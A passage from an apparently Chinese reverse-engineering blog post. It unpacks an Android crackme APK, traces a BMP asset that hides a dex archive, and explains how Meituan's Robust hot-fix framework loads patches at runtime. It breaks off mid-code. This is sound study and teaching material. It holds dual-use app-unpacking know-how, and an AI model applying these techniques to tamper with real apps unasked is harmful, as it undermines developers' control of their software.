class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;activity android:name&#x3D;&quot;cn.chaitin.geektan.crackme.MainActivity&quot;&gt;</span><br><span class="line">     &lt;intent-filter&gt;</span><br><span class="line">     &lt;action android:name&#x3D;&quot;android.intent.action.MAIN&quot;&#x2F;&gt;</span><br><span class="line">   &lt;category android:name&#x3D;&quot;android.intent.category.LAUNCHER&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;intent-filter&gt;</span><br><span class="line">&lt;&#x2F;activity&gt;</span><br></pre></td></tr></table></figure><p>在命令行中使用<code>apktool d xx.apk</code>，将APK文件反编译出来</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105162802636.png" alt="image-20210105162802636" style="zoom:50%;"><p>接下来定位到MainActivity的onCreate()方法，可以看到一些可以的变量和方法比如～～上<code>PatchProxy</code>，<code>changeQuickRedirectd</code>等</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105170653328.png" alt="image-20210105170653328"></p><p>同时看到在else中调用了this.runRobust()方法，并且在每个类中都会存在一些changeQuickRedirect变量，以及isSupport()，accessDispatch()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">private void runRobust() &#123;</span><br><span class="line">    int v4 &#x3D; 4;</span><br><span class="line">    Object[] v0 &#x3D; new Object[0];</span><br><span class="line">    ChangeQuickRedirect v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">    Class[] v5 &#x3D; new Class[0];</span><br><span class="line">    Class v6 &#x3D; Void.TYPE;</span><br><span class="line">    MainActivity v1 &#x3D; this;</span><br><span class="line">    boolean v0_1 &#x3D; PatchProxy.isSupport(v0, v1, v2, false, v4, v5, v6);</span><br><span class="line">    if(v0_1) &#123;</span><br><span class="line">        v0 &#x3D; new Object[0];</span><br><span class="line">        v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">        v5 &#x3D; new Class[0];</span><br><span class="line">        v6 &#x3D; Void.TYPE;</span><br><span class="line">        v1 &#x3D; this;</span><br><span class="line">        PatchProxy.accessDispatch(v0, v1, v2, false, v4, v5, v6);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        Context v1_1 &#x3D; this.getApplicationContext();</span><br><span class="line">        &#x2F;&#x2F;实例化PatchManipulateImp类</span><br><span class="line">        PatchManipulateImp v2_1 &#x3D; new PatchManipulateImp();</span><br><span class="line">        &#x2F;&#x2F;实例化PatchExecutor类</span><br><span class="line">        PatchExecutor v0_2 &#x3D; new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack());</span><br><span class="line">        v0_2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在runRobust()方法的else中实例化了两个对象跟进第一个PatchMainpulateImp中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105171302097.png" alt="image-20210105171302097"></p><p>发现在fetchPatchList()方法中 调用了<code>arg17.getAssets().open(**&quot;GeekTan.BMP&quot;**);</code>从资源文件夹中，还在了一个BMP的的图片文件，并将BMP文件内容写入GeekTan.jar中</p><p>具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> try &#123;</span><br><span class="line">            v10 &#x3D; arg17.getAssets().open(&quot;GeekTan.BMP&quot;);</span><br><span class="line">            v8 &#x3D; new File(arg17.getCacheDir() + File.separator + &quot;GeekTan&quot; + File.separator + &quot;GeekTan.jar&quot;);</span><br><span class="line">            if(!v8.getParentFile().exists()) &#123;</span><br><span class="line">                v8.getParentFile().mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception v9) &#123;</span><br><span class="line">            goto label_171;</span><br><span class="line">        &#125;</span><br><span class="line">&#x2F;&#x2F;将v8通过FileOutputStream方法赋值v12</span><br><span class="line">        try &#123;</span><br><span class="line">            v12 &#x3D; new FileOutputStream(v8);</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Throwable v0_3) &#123;</span><br><span class="line">            goto label_17;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int v0_4 &#x3D; 0x400;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] v7 &#x3D; new byte[v0_4];</span><br><span class="line">            while(true) &#123;</span><br><span class="line">            &#x2F;&#x2F;v10给v11赋值  v10是GeekTan.BMP</span><br><span class="line">                int v11 &#x3D; v10.read(v7);</span><br><span class="line">                if(v11 &lt;&#x3D; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">&#x2F;&#x2F;最终写入到v12中，而v12是new FileOutputStream(v8);</span><br><span class="line">                ((OutputStream)v12).write(v7, 0, v11);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Throwable v0_3) &#123;</span><br><span class="line">            goto label_88;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>查看对应的BMP文件发现是一个压缩包，里面存在一个dex文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─$ file GeekTan.BMP</span><br><span class="line">GeekTan.BMP: Zip archive data, at least v2.0 to extract</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╰─$ binwalk GeekTan.BMP</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Zip archive data, at least v2.0 to extract, name: classes.dex</span><br><span class="line">11635         0x2D73          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>同时在fetchPatchList()方法中实例化一个Patch对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Patch v13 &#x3D; new Patch();</span><br></pre></td></tr></table></figure><p>在方法的最后调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0_6 &#x3D; &quot;cn.chaitin.geektan.crackme.PatchesInfoImpl&quot;;</span><br><span class="line">v13.setPatchesInfoImplClassFullName(v0_6);</span><br></pre></td></tr></table></figure><p>然后到runRobust()，接下来实例化了PatchExecutor类，可以看到第二个参数就是PatchManipulateImp类的实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Context v1_1 &#x3D; this.getApplicationContext();</span><br><span class="line">            &#x2F;&#x2F;实例化PatchManipulateImp类</span><br><span class="line">            PatchManipulateImp v2_1 &#x3D; new PatchManipulateImp();</span><br><span class="line">            &#x2F;&#x2F;实例化PatchExecutor类</span><br><span class="line">            PatchExecutor v0_2 &#x3D; new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack());</span><br></pre></td></tr></table></figure><p>这个PatchExecutor类是在<code>com.meituan.robust</code>包下的，是一个第三方包，目前美团官方已经将其开源，在此<strong>暂停</strong>上面的分析，简单学习一下Robust。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105172538245.png" alt="image-20210105172538245"></p><h2 id="Robust热修复框架原理"><a href="#Robust热修复框架原理" class="headerlink" title="Robust热修复框架原理"></a>Robust热修复框架原理</h2><blockquote><p>Robust是美团推出的一款热修复框架，可以在github上面<a href="https://github.com/Meituan-Dianping/Robust">下载</a>它的最新的源码</p><p>Robust的基本原理，主要从下面4个步骤进行学习</p></blockquote><h3 id="1-将APK代码中每个函数都在编译打包阶段自动插入一段代码"><a href="#1-将APK代码中每个函数都在编译打包阶段自动插入一段代码" class="headerlink" title="1.将APK代码中每个函数都在编译打包阶段自动插入一段代码"></a>1.将APK代码中每个函数都在编译打包阶段自动插入一段代码</h3><p>例如，原函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public long getIndex()&#123;</span><br><span class="line">return 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他会被处理成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在该类中声明一个接口变量changeQuickRedirect</span><br><span class="line">public static ChangeQuickRedirect changeQuickRedirect;</span><br><span class="line">&#x2F;&#x2F;在要修复的方法中添加以下逻辑代码</span><br><span class="line">    public long getIndex() &#123;</span><br><span class="line">        if(changeQuickRedirect !&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;PatchProxy中封装了获取当前className和methodName的逻辑，并在其内部最终调用了changeQuickRedirect的对应函数</span><br><span class="line">            if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) &#123;</span><br><span class="line">                return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 100L;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>Robust为每个class增加了个类型为ChangeQuickRedirect的静态成员</li><li>每个方法前都插入了使用changeQuickRedirect相关的逻辑</li><li>当changeQuickRedirect不为null时，会执行到accessDispatch方法从而替换掉之前老的逻辑，达到修复的目的。</li></ul><h3 id="2-生成需要修复的类及方法的类文件并打包成dex"><a href="#2-生成需要修复的类及方法的类文件并打包成dex" class="headerlink" title="2.生成需要修复的类及方法的类文件并打包成dex"></a>2.生成需要修复的类及方法的类文件并打包成dex</h3><p>接下来你可能已经将需要修复的类及方法写好了，这个时候调用Robust的autopatch文件夹中的类及方法会生成如下主要文件：PatchesInfoImpl.java，xxxPatchControl.java（其中xxx为原类的名字）。</p><p>PatchesInfoImpl.java的内是由PatchesInfoFactory类的createPatchesInfoClass生成的，这是它生成PatchesInfoImpl逻辑，可以看到，这个类其实是用拼接得到的。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105175948713.png" alt="image-20210105175948713"></p><p>具体代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private CtClass creatxePatchesInfoClass() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">    &#x2F;&#x2F;创建PatchesInfoImpl类</span><br><span class="line">        CtClass ctPatchesInfoImpl &#x3D; classPool.makeClass(Config.patchPackageName + &quot;.PatchesInfoImpl&quot;);</span><br><span class="line">        ctPatchesInfoImpl.getClassFile().setMajorVersion(ClassFile.JAVA_7);</span><br><span class="line">        ctPatchesInfoImpl.setInterfaces(new CtClass[]&#123;classPool.get(&quot;com.meituan.robust.PatchesInfo&quot;)&#125;);</span><br><span class="line">        StringBuilder methodBody &#x3D; new StringBuilder();</span><br><span class="line">        &#x2F;&#x2F;拼接类中的内容</span><br><span class="line">        methodBody.append(&quot;public java.util.List getPatchedClassesInfo() &#123;&quot;);</span><br><span class="line">        methodBody.append(&quot;  java.util.List patchedClassesInfos &#x3D; new java.util.ArrayList();&quot;);</span><br><span class="line">        for (int i &#x3D; 0; i &lt; Config.modifiedClassNameList.size(); i++) &#123;</span><br><span class="line">            if (Constants.OBSCURE) &#123;</span><br><span class="line">                methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; &#x3D; new com.meituan.robust.PatchedClassInfo(\&quot;&quot; + ReadMapping.getInstance().getClassMappingOrDefault(Config.modifiedClassNameList.get(i)).getValueName() + &quot;\&quot;,\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf(&#39;.&#39;) + 1)) + &quot;\&quot;);&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; &#x3D; new com.meituan.robust.PatchedClassInfo(\&quot;&quot; + Config.modifiedClassNameList.get(i) + &quot;\&quot;,\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf(&#39;.&#39;) + 1)) + &quot;\&quot;);&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            methodBody.append(&quot;patchedClassesInfos.add(patchedClass&quot; + i + &quot;);&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        methodBody.append(Constants.ROBUST_UTILS_FULL_NAME + &quot;.isThrowable&#x3D;!&quot; + Config.catchReflectException + &quot;;&quot;);</span><br><span class="line">        methodBody.append(&quot;return patchedClassesInfos;\n&quot; +</span><br><span class="line">                &quot;    &#125;&quot;);</span><br><span class="line">        CtMethod m &#x3D; make(methodBody.toString(), ctPatchesInfoImpl);</span><br><span class="line">        ctPatchesInfoImpl.addMethod(m);</span><br><span class="line">        return ctPatchesInfoImpl;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        throw new RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的PatchesInfoImpl类型及类内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class PatchesInfoImpl implements PatchesInfo &#123;</span><br><span class="line">    public List getPatchedClassesInfo() &#123;</span><br><span class="line">        List arrayList &#x3D; new ArrayList();</span><br><span class="line">        &#x2F;&#x2F;PatchedClassInfo(&quot;原来的类&quot;,&quot;修复后的类control&quot;);</span><br><span class="line">        arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;, &quot;cn.chaitin.geektan.crackme.MainActivityPatchControl&quot;));</span><br><span class="line">        arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity$1&quot;, &quot;cn.chaitin.geektan.crackme.MainActivity$1PatchControl&quot;));</span><br><span class="line">        EnhancedRobustUtils.isThrowable &#x3D; false;</span><br><span class="line">        return arrayList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还会生成一个xxxPatchControl类，通过<code>PatchesControlFactory</code>的<code>createControlClass()</code>方法生成，具体的逻辑和生成PatchesInfoImpl类类似,其中每个Control类中都存在以下静态成员变量和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">private CtClass createControlClass(CtClass modifiedClass) throws Exception &#123;</span><br><span class="line">        CtClass patchClass &#x3D; classPool.get(NameManger.getInstance().getPatchName(modifiedClass.getName()));</span><br><span class="line">        patchClass.defrost();</span><br><span class="line">        CtClass controlClass &#x3D; classPool.getAndRename(Constants.PATCH_TEMPLATE_FULL_NAME, NameManger.getInstance().getPatchControlName(modifiedClass.getSimpleName()));</span><br><span class="line">        StringBuilder getRealParameterMethodBody &#x3D; new StringBuilder();</span><br><span class="line">        getRealParameterMethodBody.append(&quot;public Object getRealParameter(Object parameter) &#123;&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;if(parameter instanceof &quot; + modifiedClass.getName() + &quot;)&#123;&quot;);</span><br><span class="line">        getRealParameterMethodBody.</span><br><span class="line">                append(&quot;return new &quot; + patchClass.getName() + &quot;(parameter);&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;&#125;&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;return parameter;&#125;&quot;);</span><br><span class="line">        controlClass.addMethod(CtMethod.make(getRealParameterMethodBody.toString(), controlClass));</span><br><span class="line">        controlClass.getDeclaredMethod(&quot;accessDispatch&quot;).insertBefore(getAccessDispatchMethodBody(patchClass, modifiedClass.getName()));</span><br><span class="line">        controlClass.getDeclaredMethod(&quot;isSupport&quot;).insertBefore(getIsSupportMethodBody(patchClass, modifiedClass.getName()));</span><br><span class="line">        controlClass.defrost();</span><br><span class="line">        return controlClass;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将含有PatchesInfoImpl.java和xxxPatchControl.java,以及xxxPatch.java（具体修复的类）打包成dex文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class xxxPatchControl implements ChangeQuickRedirect</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">public static final String MATCH_ALL_PARAMETER &#x3D; &quot;(\\w*\\.)*\\w*&quot;;</span><br><span class="line"> </span><br><span class="line">private static final Map&lt;Object, Object&gt; keyToValueRelation &#x3D; new WeakHashMap();</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;获取函数的参数的方法</span><br><span class="line">public Object getRealParameter(Object obj)&#123;..具体逻辑..&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断是否支持修复</span><br><span class="line">public boolean isSupport(String methodName, Object[] paramArrayOfObject)</span><br><span class="line">&#123;..具体逻辑.&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;执行到accessDispatch方法替换旧的类方法</span><br><span class="line">public Object accessDispatch(String methodName, Object[] paramArrayOfObject) &#123;.具体逻辑..&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;解决boolean被优化成byte的问题</span><br><span class="line">private static Object fixObj(Object booleanObj) &#123;.具体逻辑..&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-加载动态dex文件，以反射的方式修改替换旧类"><a href="#3-加载动态dex文件，以反射的方式修改替换旧类" class="headerlink" title="3.加载动态dex文件，以反射的方式修改替换旧类"></a>3.加载动态dex文件，以反射的方式修改替换旧类</h3><p>回到我们刚刚分析的地方，跟进PatchExecutor类看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public void run() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F;拉取补丁列表</span><br><span class="line">        List&lt;Patch&gt; patches &#x3D; fetchPatchList();</span><br><span class="line">        &#x2F;&#x2F;应用补丁列表</span><br><span class="line">        applyPatchList(patches);</span><br><span class="line">    &#125; catch (Throwable t) &#123;</span><br><span class="line">        Log.e(&quot;robust&quot;, &quot;PatchExecutor run&quot;, t);</span><br><span class="line">        robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor,method:run,line:36&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在run方法中，主要做了2件事。</p><h4 id="1-获取补丁列表"><a href="#1-获取补丁列表" class="headerlink" title="1.获取补丁列表"></a>1.获取补丁列表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ist&lt;Patch&gt; patches &#x3D; fetchPatchList();</span><br><span class="line">&#x2F;&#x2F;PatchManipulateImp类的fetchPatchList方法</span><br><span class="line">protected List&lt;Patch&gt; fetchPatchList() &#123;</span><br><span class="line">        return patchManipulate.fetchPatchList(context);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="2-应用补丁"><a href="#2-应用补丁" class="headerlink" title="2.应用补丁"></a>2.应用补丁</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">applyPatchList(patches);</span><br><span class="line"> </span><br><span class="line">protected void applyPatchList(List&lt;Patch&gt; patches) &#123;</span><br><span class="line">       if (null &#x3D;&#x3D; patches || patches.isEmpty()) &#123;</span><br><span class="line">           return;</span><br><span class="line">       &#125;</span><br><span class="line">       Log.d(&quot;robust&quot;, &quot; patchManipulate list size is &quot; + patches.size());</span><br><span class="line">       for (Patch p : patches) &#123;</span><br><span class="line">           if (p.isAppliedSuccess()) &#123;</span><br><span class="line">               Log.d(&quot;robust&quot;, &quot;p.isAppliedSuccess() skip &quot; + p.getLocalPath());</span><br><span class="line">               continue;</span><br><span class="line">           &#125;</span><br><span class="line">           if (patchManipulate.ensurePatchExist(p)) &#123;</span><br><span class="line">               boolean currentPatchResult &#x3D; false;</span><br><span class="line">               try &#123;</span><br><span class="line">               &#x2F;&#x2F;真正应用补丁的方法patch()</span><br><span class="line">                   currentPatchResult &#x3D; patch(context, p);</span><br><span class="line">               &#125; catch (Throwable t) &#123;</span><br><span class="line">                   robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:applyPatchList line:69&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">               if (currentPatchResult) &#123;</span><br><span class="line">                   &#x2F;&#x2F;设置patch 状态为成功</span><br><span class="line">                   p.setAppliedSuccess(true);</span><br><span class="line">                   &#x2F;&#x2F;统计PATCH成功率 PATCH成功</span><br><span class="line">                   robustCallBack.onPatchApplied(true, p);</span><br><span class="line"> </span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   &#x2F;&#x2F;统计PATCH成功率 PATCH失败</span><br><span class="line">                   robustCallBack.onPatchApplied(false, p);</span><br><span class="line">               &#125;</span><br><span class="line"> </span><br><span class="line">               Log.d(&quot;robust&quot;, &quot;patch LocalPath:&quot; + p.getLocalPath() + &quot;,apply result &quot; + currentPatchResult);</span><br><span class="line"> </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>跟进patch()进行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">protected boolean patch(Context context, Patch patch) &#123;</span><br><span class="line">    &#x2F;&#x2F;验证patch的hash</span><br><span class="line">        if (!patchManipulate.verifyPatch(context, patch)) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;verifyPatch failure, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:107&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#x2F;&#x2F;调用DexClassLoader动态加载dex</span><br><span class="line">        DexClassLoader classLoader &#x3D; new DexClassLoader(patch.getTempPath(), context.getCacheDir().getAbsolutePath(),</span><br><span class="line">                null, PatchExecutor.class.getClassLoader());</span><br><span class="line">        patch.delete(patch.getTempPath());</span><br><span class="line"> </span><br><span class="line">        Class patchClass, oldClass;</span><br><span class="line"> </span><br><span class="line">        Class patchsInfoClass;</span><br><span class="line">        PatchesInfo patchesInfo &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">        &#x2F;&#x2F;动态加载PatchesInfoImpl，获取要patch的类</span><br><span class="line">            patchsInfoClass &#x3D; classLoader.loadClass(patch.getPatchesInfoImplClassFullName());</span><br><span class="line">            patchesInfo &#x3D; (PatchesInfo) patchsInfoClass.newInstance();</span><br><span class="line">            Log.d(&quot;robust&quot;, &quot;PatchsInfoImpl ok&quot;);</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:108&quot;);</span><br><span class="line">            